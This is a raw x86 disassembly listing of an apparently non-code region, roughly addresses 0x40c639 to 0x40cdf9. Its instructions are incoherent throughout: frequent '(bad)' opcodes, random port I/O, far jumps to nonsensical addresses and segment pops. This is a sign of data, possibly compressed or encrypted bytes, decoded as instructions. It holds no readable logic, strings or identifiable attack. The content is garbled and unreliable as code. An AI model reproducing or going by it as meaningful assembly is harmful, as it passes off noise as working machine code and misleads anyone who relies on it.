  40c639:	cs jb  0x40c683
  40c63c:	adc    ebx,0x428d2a3a
  40c642:	mov    cl,0xab
  40c644:	nop
  40c645:	add    eax,0xb7521be8
  40c64a:	outs   dx,DWORD PTR ds:[esi]
  40c64b:	or     BYTE PTR [eax+0x0],0xc0
  40c64f:	fidivr DWORD PTR [ebx]
  40c651:	dec    ebp
  40c652:	pop    ss
  40c653:	dec    eax
  40c654:	mov    DWORD PTR [ebx-0x78],ebp
  40c657:	jp     0x40c608
  40c659:	sbb    eax,0x5029dda3
  40c65e:	popf   
  40c65f:	shr    BYTE PTR [esi],0x34
  40c662:	push   edx
  40c663:	sbb    DWORD PTR [edx],esp
  40c665:	mov    dh,0x68
  40c667:	adc    ah,0x6e
  40c66a:	in     al,dx
  40c66b:	das    
  40c66c:	push   0x62
  40c66e:	mov    ch,0x86
  40c670:	adc    BYTE PTR [ebx-0x6c610907],cl
  40c676:	cld    
  40c677:	mov    edx,0x9fad8bfc
  40c67c:	jle    0x40c653
  40c67e:	repz into 
  40c680:	iret   
  40c681:	fimul  WORD PTR [ebp-0x2e4e22ea]
  40c687:	inc    ebx
  40c688:	rcl    bh,cl
  40c68a:	cmp    ch,BYTE PTR ds:0xa6965f66
  40c690:	outs   dx,DWORD PTR ds:[esi]
  40c691:	push   es
  40c692:	es int3 
  40c694:	ss shl edx,1
  40c697:	shl    DWORD PTR [edx+0x44],1
  40c69a:	sub    BYTE PTR [ecx],bl
  40c69c:	jo     0x40c659
  40c69e:	push   edx
  40c69f:	dec    edx
  40c6a0:	fcom   DWORD PTR [esi-0x1]
  40c6a3:	shl    BYTE PTR [edx-0x1f],0xa7
  40c6a7:	xchg   edx,eax
  40c6a8:	dec    ebx
  40c6a9:	pop    ds
  40c6aa:	in     al,dx
  40c6ab:	xor    esi,DWORD PTR [ebp-0x53]
  40c6ae:	ss pusha 
  40c6b0:	es jmp 0x40c680
  40c6b3:	fisttp WORD PTR [esi]
  40c6b5:	jmp    0xcb3d8b5c
  40c6ba:	push   ebp
  40c6bb:	cs ret 
  40c6bd:	and    BYTE PTR [edx+ecx*2],0x63
  40c6c1:	test   BYTE PTR [ecx-0x18],dh
  40c6c4:	cmp    dh,BYTE PTR [ecx-0x3843bf37]
  40c6ca:	push   esp
  40c6cb:	mov    bh,0x63
  40c6cd:	in     al,0xa6
  40c6cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6d0:	setno  al
  40c6d3:	into   
  40c6d4:	rep lods eax,DWORD PTR ds:[esi]
  40c6d6:	clc    
  40c6d7:	jnp    0x40c758
  40c6d9:	mov    dh,0xd3
  40c6db:	push   cs
  40c6dc:	daa    
  40c6dd:	jbe    0x40c75e
  40c6df:	test   dl,0x91
  40c6e2:	sub    esp,DWORD PTR ds:0xc7ad0926
  40c6e8:	xchg   esi,eax
  40c6e9:	imul   DWORD PTR [ecx]
  40c6eb:	add    BYTE PTR [edx-0x47ca892c],0x16
  40c6f2:	and    DWORD PTR [ebx+0x2a3789bc],edi
  40c6f8:	je     0x40c6aa
  40c6fa:	add    al,0x7d
  40c6fc:	lods   al,BYTE PTR ds:[esi]
  40c6fd:	(bad)  
  40c6fe:	ss xchg edi,eax
  40c700:	into   
  40c701:	shl    DWORD PTR [edx+0x5a],0xfa
  40c705:	mov    bl,0xe8
  40c707:	jbe    0x40c780
  40c709:	cmp    BYTE PTR fs:[edx],bl
  40c70c:	mov    ebp,0xe8bd95c7
  40c711:	imul   ebp,ecx,0xffffffd1
  40c714:	adc    al,0x41
  40c716:	jp     0x40c6f5
  40c718:	cli    
  40c719:	shl    cl,1
  40c71b:	xor    dh,BYTE PTR [edi+edi*2]
  40c71e:	mov    bh,al
  40c720:	xchg   ebp,eax
  40c721:	jle    0x40c78c
  40c723:	jno    0x40c6ae
  40c725:	jne    0x40c79e
  40c727:	shr    BYTE PTR [eax+0x74baa609],0xee
  40c72e:	or     edx,DWORD PTR [ecx]
  40c730:	mov    cl,0x8a
  40c732:	dec    edx
  40c733:	adc    BYTE PTR [ebx-0x5f495253],al
  40c739:	sub    BYTE PTR [esi],dl
  40c73b:	xor    esi,DWORD PTR [esi+0x11f7225a]
  40c741:	sub    DWORD PTR [ebp+0xb057c3f],ebp
  40c747:	xor    edx,DWORD PTR [ebx+0x71c0c8ae]
  40c74d:	adc    edi,edi
  40c74f:	test   DWORD PTR ds:0x3bcbe4ad,edi
  40c755:	inc    esi
  40c756:	dec    esi
  40c757:	pop    ss
  40c758:	push   ss
  40c759:	(bad)  
  40c75a:	imul   esi,DWORD PTR [edi-0x52],0xa14e3239
  40c761:	iret   
  40c762:	retf   0xd00c
  40c765:	into   
  40c766:	les    edx,FWORD PTR cs:[edx+0x49]
  40c76a:	fdivr  DWORD PTR [ecx+0x65]
  40c76d:	int    0xa6
  40c76f:	xchg   ebp,eax
  40c770:	int3   
  40c771:	dec    esp
  40c772:	xor    eax,0x7c90e821
  40c777:	xchg   edi,eax
  40c778:	fldenv [edi-0x7d]
  40c77b:	xchg   esi,eax
  40c77c:	mov    edx,DWORD PTR [edx-0x4e]
  40c77f:	scas   al,BYTE PTR es:[edi]
  40c780:	xchg   esi,eax
  40c781:	shl    dl,1
  40c783:	(bad)
  40c786:	fcmovnb st,st(1)
  40c788:	cmc    
  40c789:	mov    ah,0x1e
  40c78b:	(bad)  
  40c78d:	(bad)  
  40c78e:	retf   0x8b2c
  40c791:	in     eax,0xe9
  40c793:	mov    al,0x6f
  40c795:	jle    0x40c7b1
  40c797:	bound  ecx,QWORD PTR [esi]
  40c799:	push   ss
  40c79a:	int    0xec
  40c79c:	aam    0x4a
  40c79e:	pusha  
  40c79f:	fldenv [eax]
  40c7a1:	push   ebp
  40c7a2:	test   DWORD PTR [ebx],ebx
  40c7a4:	sub    BYTE PTR [ecx],bh
  40c7a6:	std    
  40c7a7:	in     al,0x32
  40c7a9:	sub    eax,0x5eff0e6e
  40c7ae:	mov    ecx,edx
  40c7b0:	sub    al,0x91
  40c7b2:	xchg   edx,eax
  40c7b3:	and    edi,DWORD PTR [esi-0x61457e26]
  40c7b9:	push   es
  40c7ba:	or     bl,bh
  40c7bc:	cmc    
  40c7bd:	inc    dx
  40c7bf:	stc    
  40c7c0:	add    BYTE PTR [ebp-0x2b],ah
  40c7c3:	mov    eax,0x918103c9
  40c7c8:	xlat   BYTE PTR ds:[ebx]
  40c7c9:	fsub   QWORD PTR [edi-0x4d]
  40c7cc:	gs and al,0x0
  40c7cf:	adc    al,ch
  40c7d1:	scas   al,BYTE PTR es:[edi]
  40c7d2:	xor    DWORD PTR [eax+0x24db0809],0xffffffc4
  40c7d9:	inc    edi
  40c7da:	xchg   ebp,eax
  40c7db:	cmp    eax,0xa2395920
  40c7e0:	rcl    DWORD PTR [esi+0x68],cl
  40c7e3:	mov    ebx,0xd69ce214
  40c7e8:	ds pop edi
  40c7ea:	or     al,0x87
  40c7ec:	stos   BYTE PTR es:[edi],al
  40c7ed:	xchg   ebp,eax
  40c7ee:	push   ebp
  40c7ef:	cmp    eax,0xdc8a728
  40c7f4:	mulps  xmm7,xmm0
  40c7f7:	jmp    0x40c7f1
  40c7f9:	test   eax,0xaf9eaa96
  40c7fe:	xor    al,0xed
  40c800:	push   cs
  40c801:	repnz mov eax,ds:0xa3f76e77
  40c807:	xchg   edx,eax
  40c808:	cwde   
  40c809:	sub    ebp,DWORD PTR [ecx+0x5a0588b7]
  40c80f:	inc    esp
  40c810:	in     al,dx
  40c811:	sub    DWORD PTR [edi+esi*2+0x4d],0xffffffca
  40c816:	lods   al,BYTE PTR ds:[esi]
  40c817:	jmp    0x8db8db78
  40c81c:	push   edi
  40c81d:	mov    BYTE PTR [edx+eiz*1+0x179b9ac5],ah
  40c824:	ror    DWORD PTR [ebx+0x766f0a9],1
  40c82a:	rcl    DWORD PTR [ebx-0x41],0x47
  40c82e:	adc    DWORD PTR [edi],esi
  40c830:	inc    edx
  40c831:	or     cl,BYTE PTR [ebp+0x58ba91e6]
  40c837:	add    eax,0x65333955
  40c83c:	int3   
  40c83d:	sbb    cl,BYTE PTR [ecx+0x76d0379b]
  40c843:	pop    ecx
  40c844:	mov    al,0xcb
  40c846:	inc    ecx
  40c847:	outs   dx,BYTE PTR ds:[esi]
  40c848:	and    DWORD PTR [ebp-0x41],ebx
  40c84b:	cmc    
  40c84c:	jno    0x40c844
  40c84e:	fcmovb st,st(6)
  40c850:	rcr    BYTE PTR [ebp+0x5a],1
  40c853:	in     al,0x77
  40c855:	mov    ah,0xb
  40c857:	adc    esi,DWORD PTR [ebx-0x4997627e]
  40c85d:	aam    0x76
  40c85f:	mov    dl,cl
  40c861:	pushfw 
  40c863:	push   ss
  40c864:	push   esi
  40c865:	outs   dx,BYTE PTR ds:[esi]
  40c866:	sahf   
  40c867:	sbb    DWORD PTR [ecx-0x39],ebx
  40c86a:	loop   0x40c87b
  40c86c:	pop    esi
  40c86d:	mov    ah,0x77
  40c86f:	pop    ebx
  40c870:	lock test eax,0x1fd2d4f0
  40c876:	(bad)  
  40c877:	aam    0x31
  40c879:	hlt    
  40c87a:	pop    edx
  40c87b:	in     eax,0xc6
  40c87d:	sub    bh,BYTE PTR [eax+0x7b]
  40c880:	jp     0x40c8d2
  40c882:	push   0x30
  40c884:	mov    edi,0x63a04b51
  40c889:	in     al,0xed
  40c88b:	out    0x52,eax
  40c88d:	sti    
  40c88e:	inc    ebp
  40c88f:	mov    edi,0x9b65e373
  40c894:	push   ebx
  40c895:	ds pop ebp
  40c897:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40c899:	xchg   ecx,eax
  40c89a:	aam    0x1c
  40c89c:	mov    cl,0xe2
  40c89e:	inc    edi
  40c89f:	cmp    eax,0x55aa79b5
  40c8a4:	pop    ebx
  40c8a5:	mov    bh,0x2d
  40c8a7:	sub    DWORD PTR [ecx],ecx
  40c8a9:	mov    ebx,0x96e1423a
  40c8ae:	imul   edi,edx,0x61
  40c8b1:	enter  0x7212,0x11
  40c8b5:	add    ecx,DWORD PTR [esp+esi*2-0x70de4d71]
  40c8bc:	jp     0x40c8d4
  40c8be:	aad    0x48
  40c8c0:	pop    edi
  40c8c1:	scas   al,BYTE PTR es:[edi]
  40c8c2:	shl    BYTE PTR [ebx],0x80
  40c8c5:	js     0x40c90c
  40c8c7:	mov    dh,0xab
  40c8c9:	aas    
  40c8ca:	pop    ebx
  40c8cb:	imul   BYTE PTR ss:[ecx]
  40c8ce:	test   BYTE PTR [ecx+0x2d3f743a],ah
  40c8d4:	xchg   ebp,eax
  40c8d5:	scas   eax,DWORD PTR es:[edi]
  40c8d6:	add    eax,0x1044567f
  40c8db:	adc    al,0x24
  40c8dd:	les    edi,FWORD PTR [eax+ecx*1-0xa]
  40c8e1:	mov    WORD PTR [ebx+edi*2+0x31],?
  40c8e5:	add    al,0x86
  40c8e8:	add    DWORD PTR [ebp-0x7d8ffa6],0x654c9f68
  40c8f2:	cwde   
  40c8f3:	popa   
  40c8f4:	stos   BYTE PTR es:[edi],al
  40c8f5:	das    
  40c8f6:	jecxz  0x40c8e2
  40c8f8:	lods   eax,DWORD PTR ds:[esi]
  40c8f9:	dec    esp
  40c8fa:	loop   0x40c8e2
  40c8fc:	pop    edi
  40c8fd:	add    DWORD PTR [edi],ebp
  40c8ff:	fnstsw WORD PTR [edx+0x3fd3ed88]
  40c905:	xchg   ecx,eax
  40c906:	adc    eax,0xb4ee4dce
  40c90b:	(bad)  
  40c90c:	stos   BYTE PTR es:[edi],al
  40c90d:	jae    0x40c989
  40c90f:	adc    BYTE PTR [eax],bl
  40c911:	(bad)  
  40c912:	leave  
  40c913:	sub    ecx,eax
  40c915:	fsubr  st(2),st
  40c917:	jno    0x40c985
  40c919:	cmc    
  40c91a:	dec    eax
  40c91b:	sbb    bh,BYTE PTR [ebx+0x302988a6]
  40c921:	mov    ?,WORD PTR [ebx-0x6a89688c]
  40c927:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40c929:	mov    bl,0xd3
  40c92b:	mov    ebp,DWORD PTR [ebx-0x77]
  40c92e:	add    edx,DWORD PTR [ecx]
  40c930:	cmp    al,0x55
  40c932:	jae    0x40c8e5
  40c934:	push   edi
  40c935:	mov    edx,DWORD PTR [esi-0x6395efca]
  40c93b:	shl    eax,1
  40c93d:	das    
  40c93e:	test   DWORD PTR ds:0xf48dd458,ebp
  40c944:	daa    
  40c945:	mov    ecx,0x1d0b4a01
  40c94a:	dec    edx
  40c94b:	sbb    ch,BYTE PTR [edx+edx*2-0x1e]
  40c94f:	sbb    cl,al
  40c951:	mov    eax,ds:0x30ad5c08
  40c956:	jg     0x40c91c
  40c958:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c959:	add    DWORD PTR [edi],esp
  40c95b:	sbb    eax,0x6d8c47cf
  40c960:	test   DWORD PTR [ecx],ebp
  40c962:	aam    0xe9
  40c964:	int3   
  40c965:	ja     0x40c8f3
  40c967:	mov    cl,bl
  40c969:	shr    DWORD PTR [ecx],0xcf
  40c96c:	xchg   DWORD PTR [ecx+eax*4-0x5faabf59],esi
  40c973:	ins    DWORD PTR es:[edi],dx
  40c974:	test   DWORD PTR [edi-0xb],edi
  40c977:	push   DWORD PTR [ebp+0x4fde50f1]
  40c97d:	xor    BYTE PTR [eax+esi*8],ah
  40c980:	dec    esi
  40c981:	or     ecx,DWORD PTR [ecx+0x5f]
  40c984:	arpl   WORD PTR [edx],si
  40c986:	inc    edi
  40c987:	fs fs add bl,cl
  40c98b:	scas   al,BYTE PTR es:[edi]
  40c98c:	sbb    eax,0xefa4933e
  40c991:	sub    eax,0xed8c790c
  40c996:	xchg   ebx,eax
  40c997:	push   ecx
  40c998:	(bad)  
  40c999:	shrd   DWORD PTR [ecx+eiz*8-0x2],esp,cl
  40c99e:	popf   
  40c99f:	lods   al,BYTE PTR ds:[esi]
  40c9a0:	push   ds
  40c9a1:	es clc 
  40c9a3:	mov    dh,0xa8
  40c9a5:	jle    0x40c9b8
  40c9a7:	rep stos DWORD PTR es:[edi],eax
  40c9a9:	xchg   edi,eax
  40c9aa:	mov    ebx,0xf472bc87
  40c9af:	data16 cmp cl,BYTE PTR [ebx-0x28]
  40c9b3:	adc    BYTE PTR [edi],dl
  40c9b5:	lods   eax,DWORD PTR ds:[esi]
  40c9b6:	mov    esp,0x942986aa
  40c9bb:	add    al,BYTE PTR [ecx+0x4a4e45fe]
  40c9c1:	or     ebp,DWORD PTR [edi-0x7b7085b0]
  40c9c7:	dec    ecx
  40c9c8:	lods   eax,DWORD PTR ds:[esi]
  40c9c9:	scas   eax,DWORD PTR es:[edi]
  40c9ca:	xchg   ecx,eax
  40c9cb:	bound  edx,QWORD PTR [ebx+0x5c]
  40c9ce:	dec    ebp
  40c9cf:	inc    ebx
  40c9d0:	inc    ecx
  40c9d1:	mov    ebp,DWORD PTR [ebx-0x3c2eea50]
  40c9d7:	pop    esi
  40c9d8:	pop    ss
  40c9d9:	jge    0x40c9ab
  40c9db:	mov    bl,dl
  40c9dd:	stos   DWORD PTR es:[edi],eax
  40c9de:	(bad)  
  40c9df:	sbb    eax,0x34eb8276
  40c9e4:	mov    bl,0xf
  40c9e6:	push   ds
  40c9e7:	jbe    0x40c9ee
  40c9e9:	mov    ds:0x614964c1,eax
  40c9ee:	neg    BYTE PTR [esi-0x48bc3d69]
  40c9f4:	fisttp DWORD PTR [esi+0x5cd1f1b4]
  40c9fa:	mov    ah,0x94
  40c9fc:	push   0xa462b54e
  40ca01:	and    eax,0x3428fbf6
  40ca06:	add    al,0xb6
  40ca08:	shl    bh,1
  40ca0a:	lods   eax,DWORD PTR ds:[esi]
  40ca0b:	xlat   BYTE PTR ds:[ebx]
  40ca0c:	push   esp
  40ca0d:	xchg   dh,ah
  40ca0f:	mov    esp,0xe571b428
  40ca14:	xor    eax,0x8fbf1dd4
  40ca19:	cwde   
  40ca1a:	rcl    BYTE PTR [ebp+0x216c50f1],1
  40ca20:	(bad)  
  40ca21:	in     al,dx
  40ca22:	inc    ecx
  40ca23:	or     edi,DWORD PTR [edx+0x1dec1e9b]
  40ca29:	xor    eax,0xb3338c65
  40ca2e:	test   ebx,esp
  40ca30:	aad    0x12
  40ca32:	mov    dl,BYTE PTR fs:[ebp+0x3d]
  40ca36:	mov    ss,WORD PTR [esi]
  40ca38:	rol    DWORD PTR ds:0x78afea3e,cl
  40ca3e:	mov    cl,0x97
  40ca40:	(bad)  
  40ca41:	mov    ebp,0xe76f8160
  40ca46:	ror    BYTE PTR [eax],cl
  40ca48:	out    0xfd,eax
  40ca4a:	mov    cl,0x75
  40ca4c:	inc    ebx
  40ca4d:	pop    ds
  40ca4e:	jmp    0xda44e1d7
  40ca53:	xchg   BYTE PTR [esi-0x16],al
  40ca56:	sub    eax,DWORD PTR [ebx+0x1a]
  40ca59:	lahf   
  40ca5a:	lahf   
  40ca5b:	push   ecx
  40ca5c:	inc    ebp
  40ca5d:	test   al,0xd1
  40ca5f:	dec    eax
  40ca60:	mov    ah,0x4
  40ca62:	fisttp QWORD PTR [eax-0x5ed78b01]
  40ca68:	cs out dx,al
  40ca6a:	add    ah,BYTE PTR [ebx*1+0x2bcddf3b]
  40ca71:	add    al,0x8c
  40ca73:	das    
  40ca74:	lds    esi,FWORD PTR fs:[ebp-0x40]
  40ca78:	mov    ch,0xaa
  40ca7a:	in     eax,dx
  40ca7b:	mov    DWORD PTR ss:[ebx+0x68],0x956a8882
  40ca83:	call   0x7dc4679b
  40ca88:	pop    ebp
  40ca89:	fucomp st(6)
  40ca8b:	pop    ds
  40ca8c:	sbb    bl,0x9
  40ca8f:	xchg   edi,eax
  40ca90:	imul   ecx,DWORD PTR [ebx-0x16],0x102b51be
  40ca97:	cwde   
  40ca98:	mov    ds:0x233cd640,eax
  40ca9d:	out    0x43,eax
  40ca9f:	jno    0x40cab3
  40caa1:	test   DWORD PTR [ecx-0xa],edi
  40caa4:	xchg   edi,eax
  40caa5:	adc    BYTE PTR [eax+ebp*8+0x6ebc075b],al
  40caac:	xchg   ecx,eax
  40caad:	xlat   BYTE PTR ds:[ebx]
  40caae:	xchg   ecx,eax
  40caaf:	enter  0x5739,0xff
  40cab3:	and    BYTE PTR [eax+0x3b],dh
  40cab6:	mov    ds:0x1c74e2b1,eax
  40cabb:	mov    DWORD PTR ds:0x2637c086,esp
  40cac1:	push   ds
  40cac2:	sbb    esi,ecx
  40cac4:	xor    edx,esp
  40cac6:	jmp    0x40cabf
  40cac8:	rcl    DWORD PTR [edi],0x6e
  40cacb:	stc    
  40cacc:	or     BYTE PTR [edx*8-0x37caa77d],bh
  40cad3:	rcl    DWORD PTR [ebx-0xae57854],1
  40cad9:	dec    eax
  40cada:	in     al,dx
  40cadb:	gs stos BYTE PTR es:[di],al
  40cade:	and    al,0x3e
  40cae0:	(bad)  
  40cae2:	push   0x47b1b0bc
  40cae7:	pop    ss
  40cae8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cae9:	in     al,dx
  40caea:	and    BYTE PTR [edx],dl
  40caec:	xchg   ebp,eax
  40caed:	fs in  al,dx
  40caef:	sar    BYTE PTR [eax-0x7e],0xfa
  40caf3:	sti    
  40caf4:	dec    esp
  40caf5:	aaa    
  40caf6:	pop    ebx
  40caf7:	scas   eax,DWORD PTR es:[edi]
  40caf8:	(bad)  
  40caf9:	sar    BYTE PTR [eax+0xab404c],0xcd
  40cb00:	in     al,0xc0
  40cb02:	mov    eax,ecx
  40cb04:	stos   BYTE PTR es:[edi],al
  40cb05:	ss xor ch,dl
  40cb08:	sti    
  40cb09:	aam    0x6b
  40cb0b:	sahf   
  40cb0c:	aad    0x25
  40cb0e:	or     eax,0x84997e2f
  40cb13:	add    dh,bl
  40cb15:	jg     0x40cab7
  40cb17:	iret   
  40cb18:	ret    
  40cb19:	repz sbb al,0x82
  40cb1c:	xchg   ebx,eax
  40cb1d:	xor    BYTE PTR [ecx],0x6
  40cb20:	retf   0x5b87
  40cb23:	inc    edx
  40cb24:	psubq  mm7,QWORD PTR [edx+ebp*4]
  40cb28:	mov    ds:0xb83f15a5,al
  40cb2d:	mov    ?,WORD PTR [eax]
  40cb2f:	xor    ch,dh
  40cb31:	cmp    eax,0xbdaa1959
  40cb36:	jae    0x40cb3b
  40cb38:	mov    eax,0x70db45cf
  40cb3d:	push   ds
  40cb3e:	jmp    0x524c:0x408a5969
  40cb45:	push   esp
  40cb46:	hlt    
  40cb47:	dec    ebx
  40cb48:	adc    ecx,DWORD PTR [edx]
  40cb4a:	dec    ecx
  40cb4b:	dec    esp
  40cb4c:	or     eax,0xfd967cfb
  40cb51:	inc    ebp
  40cb52:	dec    edx
  40cb53:	outs   dx,BYTE PTR ds:[esi]
  40cb54:	push   esi
  40cb55:	dec    esp
  40cb56:	jl     0x40cb08
  40cb58:	je     0x40cbd7
  40cb5a:	call   0x10165737
  40cb5f:	outs   dx,BYTE PTR ds:[esi]
  40cb60:	jmp    0xc66b0c4d
  40cb65:	ret    
  40cb66:	mov    ds:0x2743d1ac,al
  40cb6b:	or     bh,bh
  40cb6d:	mov    ebx,0x466d069b
  40cb72:	push   edi
  40cb73:	aaa    
  40cb74:	xor    DWORD PTR [eax],edx
  40cb76:	in     eax,0x36
  40cb78:	stos   DWORD PTR es:[edi],eax
  40cb79:	pop    ebx
  40cb7a:	xchg   edx,eax
  40cb7b:	inc    esp
  40cb7c:	or     ebp,DWORD PTR [edi]
  40cb7e:	shl    edi,cl
  40cb80:	cmp    cl,bl
  40cb82:	xchg   BYTE PTR [eax],cl
  40cb84:	xchg   ch,ah
  40cb86:	cmp    DWORD PTR [ebp-0x60],ebp
  40cb89:	adc    al,0x63
  40cb8b:	xchg   ecx,eax
  40cb8c:	pop    esi
  40cb8d:	fisttp DWORD PTR [edx+0x24]
  40cb90:	test   BYTE PTR [ecx],cl
  40cb92:	cmp    al,0x47
  40cb94:	jns    0x40cb53
  40cb96:	icebp  
  40cb97:	mov    ds:0xecf2e8a6,al
  40cb9c:	aas    
  40cb9d:	in     al,dx
  40cb9e:	push   esi
  40cb9f:	shl    dl,0x65
  40cba2:	mov    edx,0x6b45ae05
  40cba7:	cdq    
  40cba8:	pusha  
  40cba9:	inc    ecx
  40cbaa:	pop    ebp
  40cbab:	into   
  40cbac:	inc    esi
  40cbad:	icebp  
  40cbae:	data16 (bad) 
  40cbb0:	sti    
  40cbb1:	iret   
  40cbb2:	mov    ebp,DWORD PTR [esi+0x4ef7f64e]
  40cbb8:	xor    BYTE PTR [ebp+0x57],0x6
  40cbbc:	in     eax,0xff
  40cbbe:	pop    ss
  40cbbf:	mov    bl,0x39
  40cbc1:	cmp    BYTE PTR [ebx-0x3aa92b7a],bh
  40cbc7:	shl    BYTE PTR [edi],0xfb
  40cbca:	mov    bh,0x4a
  40cbcc:	pop    eax
  40cbcd:	fwait
  40cbce:	stc    
  40cbcf:	or     edi,DWORD PTR [edx+0x16]
  40cbd2:	pop    ecx
  40cbd3:	pusha  
  40cbd4:	pop    esi
  40cbd5:	fistp  WORD PTR [esi]
  40cbd7:	not    BYTE PTR [edi+0x75df5e16]
  40cbdd:	es xor eax,0x2c434d18
  40cbe3:	sbb    eax,0x8934cd5b
  40cbe8:	fdivr  QWORD PTR [ecx]
  40cbea:	popf   
  40cbeb:	call   FWORD PTR [edi]
  40cbed:	jns    0x40cb7e
  40cbef:	jle    0x40cc0a
  40cbf1:	cmp    dl,bh
  40cbf3:	or     al,0x4e
  40cbf5:	and    ah,dh
  40cbf7:	addr16 popa 
  40cbf9:	aas    
  40cbfa:	add    al,0xad
  40cbfc:	xlat   BYTE PTR ds:[ebx]
  40cbfd:	js     0x40cbd1
  40cbff:	or     eax,0xb60fa1d8
  40cc04:	push   0x74
  40cc06:	sar    BYTE PTR [edi+0x15],1
  40cc09:	bound  ebx,QWORD PTR [ebx]
  40cc0b:	mov    ch,BYTE PTR [edx-0x63]
  40cc0e:	imul   BYTE PTR [eax*8+0xe8e54ed]
  40cc15:	mov    al,0xac
  40cc17:	hlt    
  40cc18:	inc    ebp
  40cc19:	aas    
  40cc1a:	adc    ebp,DWORD PTR [eax]
  40cc1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc1d:	sbb    eax,0x135ada71
  40cc22:	cmc    
  40cc23:	cmp    BYTE PTR [ecx-0xde5c7f1],dl
  40cc29:	sbb    esi,DWORD PTR ds:0x9c655f29
  40cc2f:	scas   al,BYTE PTR es:[edi]
  40cc30:	in     eax,dx
  40cc31:	push   edi
  40cc32:	mov    DWORD PTR [ebx],ebx
  40cc34:	loopne 0x40cc7b
  40cc36:	xchg   DWORD PTR [ecx+0x19733ea6],edx
  40cc3c:	retf   0x204c
  40cc3f:	and    eax,0x371c3f71
  40cc44:	cmp    eax,0x19fb7142
  40cc49:	rol    DWORD PTR [ebx+0x4a27823e],cl
  40cc4f:	test   eax,0x6345a28f
  40cc54:	hlt    
  40cc55:	imul   ebp,DWORD PTR [ecx-0x15],0x28
  40cc59:	jmp    DWORD PTR [ecx-0x5b]
  40cc5c:	sub    edi,ebp
  40cc5e:	enter  0x3801,0x9b
  40cc62:	gs ret 0x12b5
  40cc66:	test   DWORD PTR [ebx],edi
  40cc68:	cmp    DWORD PTR [edx],ebp
  40cc6a:	ror    DWORD PTR [ecx+edi*1-0x52],1
  40cc6e:	addr16 sti 
  40cc70:	shl    al,0xc1
  40cc73:	inc    esp
  40cc74:	cmp    BYTE PTR [ecx-0x672da76f],cl
  40cc7a:	mov    esi,0x751a3845
  40cc7f:	jmp    0x40cc4e
  40cc81:	retf   
  40cc82:	ret    0x5137
  40cc85:	or     BYTE PTR [ecx+edx*8-0x2122711e],cl
  40cc8c:	push   ebx
  40cc8d:	xor    al,0x9c
  40cc8f:	mov    ecx,0x346c6b03
  40cc94:	add    eax,DWORD PTR [edx]
  40cc96:	clc    
  40cc97:	jmp    0x40ccce
  40cc99:	and    DWORD PTR [eax],eax
	...
  40cd13:	add    BYTE PTR ds:0xf69202c1,dh
  40cd19:	shl    DWORD PTR [ebp+0x29d829e7],cl
  40cd1f:	scas   eax,DWORD PTR es:[edi]
  40cd20:	out    dx,al
  40cd21:	fcom   QWORD PTR [edi+0x7c7f23]
  40cd27:	add    BYTE PTR [esi+0x7],ch
  40cd2a:	add    BYTE PTR [eax],al
  40cd2c:	cvtps2pi mm2,QWORD PTR [ecx+0x2a]
  40cd30:	mov    cl,0x25
  40cd32:	retf   0x55f7
  40cd35:	push   eax
  40cd36:	push   ds
  40cd37:	in     eax,dx
  40cd38:	stos   DWORD PTR es:[edi],eax
  40cd39:	xor    esp,esp
  40cd3b:	cli    
  40cd3c:	jecxz  0x40cd37
  40cd3e:	pushf  
  40cd3f:	out    0xb7,al
  40cd41:	and    al,0xbc
  40cd43:	dec    esi
  40cd44:	lahf   
  40cd45:	call   0xae96:0x654d4c73
  40cd4c:	dec    esp
  40cd4d:	xlat   BYTE PTR ds:[ebx]
  40cd4e:	push   0x34
  40cd50:	push   ebx
  40cd51:	lahf   
  40cd52:	push   ecx
  40cd53:	push   edx
  40cd54:	sub    WORD PTR [edi-0x17],di
  40cd58:	je     0x40ccf0
  40cd5a:	xor    BYTE PTR [edx-0x408c444f],cl
  40cd60:	jmp    0x84e6723b
  40cd65:	scas   al,BYTE PTR es:[edi]
  40cd66:	(bad)  
  40cd67:	inc    ebx
  40cd68:	jne    0x40ccfb
  40cd6a:	cdq    
  40cd6b:	inc    edi
  40cd6c:	sbb    BYTE PTR [ebx],al
  40cd6e:	imul   esi,DWORD PTR [eax],0xcdc2f50
  40cd74:	iret   
  40cd75:	push   esp
  40cd76:	and    DWORD PTR [esi+ebp*4],ebx
  40cd79:	mov    dl,BYTE PTR [ebp-0x4d]
  40cd7c:	fwait
  40cd7d:	out    0x66,al
  40cd7f:	jecxz  0x40cd4f
  40cd81:	dec    eax
  40cd82:	inc    dx
  40cd84:	sbb    DWORD PTR [eax+edi*4],eax
  40cd87:	adc    bl,BYTE PTR ds:0xbfe325ef
  40cd8d:	cdq    
  40cd8e:	mov    ds:0xe0c560bc,eax
  40cd93:	xchg   edx,eax
  40cd94:	jns    0x40cdd2
  40cd96:	mov    bl,0x9d
  40cd98:	inc    ebx
  40cd99:	sbb    cl,dh
  40cd9b:	in     eax,0xd5
  40cd9d:	pop    edi
  40cd9e:	adc    dl,BYTE PTR [ebp+edx*2+0x59]
  40cda2:	arpl   WORD PTR [eax+0x9befcd5],bp
  40cda8:	mov    ebp,0xca2e3d90
  40cdad:	dec    eax
  40cdae:	aaa    
  40cdaf:	jmp    0x40cd5f
  40cdb1:	pushf  
  40cdb2:	fadd   DWORD PTR [edx-0x22]
  40cdb5:	jb     0x40cd8a
  40cdb7:	pop    es
  40cdb8:	sbb    eax,0x730559ed
  40cdbd:	mov    ebx,0x51dd3201
  40cdc2:	(bad)
  40cdc6:	out    dx,eax
  40cdc7:	imul   edx,DWORD PTR [ecx-0x64],0x4a7f9647
  40cdce:	call   0x5a72b010
  40cdd3:	xchg   edi,eax
  40cdd4:	iret   
  40cdd5:	mov    eax,ds:0x2e8d5b34
  40cdda:	scas   al,BYTE PTR es:[edi]
  40cddb:	mov    esp,0x5b21b846
  40cde0:	xor    al,0x53
  40cde2:	jl     0x40ce61
  40cde4:	std    
  40cde5:	lds    ecx,FWORD PTR [edx]
  40cde7:	cmp    eax,0x25092f4
  40cdec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cded:	or     al,0xe3
  40cdef:	push   esi
  40cdf0:	xchg   ebp,eax
  40cdf1:	bound  eax,QWORD PTR [ebx]
  40cdf3:	mov    ds:0x2a84140a,eax
  40cdf8:	xchg   ecx,eax
  40cdf9:	es dec ecx
